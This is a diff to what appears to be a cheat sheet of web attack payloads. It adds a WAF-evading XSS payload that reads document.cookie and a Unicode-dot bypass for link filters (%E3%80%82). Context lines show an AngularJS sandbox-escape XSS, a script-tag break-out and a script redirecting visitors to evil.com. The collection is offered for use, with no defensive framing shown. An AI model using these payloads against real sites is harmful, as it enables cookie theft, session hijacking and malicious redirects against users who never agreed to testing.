@@ -474,6 +474,9 @@ style: dsfsdfsdfsdf"><script>alert(9)</script><!--
 
 ANGULAR
 ?q=wrtz{{(_="".sub).call.call({}[$="constructor"].getOwnPropertyDescriptor(_.__proto__,$).value,0,"alert(1)")()}}zzzz
+
+WAF
+oalertnfocus=alalertert(documealertnt.cookie) autofocus
   
 ```
 
@@ -542,13 +545,12 @@ edit?image=http://securityidiots.com?vimeocdn.com/.png - ссылалось на
 <body>
 <script>top.window.location = "https://evil.com";<script>
 </body>
-...
-...
-```
 
 **Link filter protection bypass**
-```
-?url=site%E3%80%82com
+Usage: ?url=//google。com
+Goes to: https://google.com
+URL encoded: %E3%80%82
+?url=google%E3%80%82com
 ```
 
 **CRLF(Carriage Return Line Feed)**
